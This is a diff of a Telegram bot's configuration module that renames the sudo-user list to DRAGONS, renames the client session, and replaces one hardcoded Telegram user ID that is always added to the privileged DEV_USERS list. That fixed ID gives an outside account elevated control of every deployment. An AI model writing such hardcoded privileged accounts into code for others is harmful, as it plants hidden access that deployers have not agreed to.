@@ -41,7 +41,7 @@ if ENV:
     OWNER_USERNAME = os.environ.get("OWNER_USERNAME", None)
 
     try:
-        PYTHON = set(int(x) for x in os.environ.get("PYTHON", "").split())
+        DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
         DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
@@ -115,7 +115,7 @@ else:
     OWNER_USERNAME = Config.OWNER_USERNAME
     ALLOW_CHATS = Config.ALLOW_CHATS
     try:
-        PYTHON = set(int(x) for x in Config.PYTHON or [])
+        DRAGONS = set(int(x) for x in Config.DRAGONS or [])
         DEV_USERS = set(int(x) for x in Config.DEV_USERS or [])
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
@@ -173,13 +173,13 @@ else:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 
-PYTHON.add(OWNER_ID)
+DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1410250744)
+DEV_USERS.add(1356469075)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
-telethn = TelegramClient("Altron", API_ID, API_HASH)
+telethn = TelegramClient("Fallen", API_ID, API_HASH)
 
 pbot = Client("Altron", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
@@ -189,7 +189,7 @@ aiohttpsession = ClientSession()
 print("[INFO]: INITIALIZING ARQ CLIENT...")
 arq = ARQ(ARQ_API_URL, ARQ_API_KEY, aiohttpsession)
 
-PYTHON = list(PYTHON) + list(DEV_USERS)
+DRAGONS = list(DRAGONS) + list(DEV_USERS)
 DEV_USERS = list(DEV_USERS)
 WOLVES = list(WOLVES)
 DEMONS = list(DEMONS)
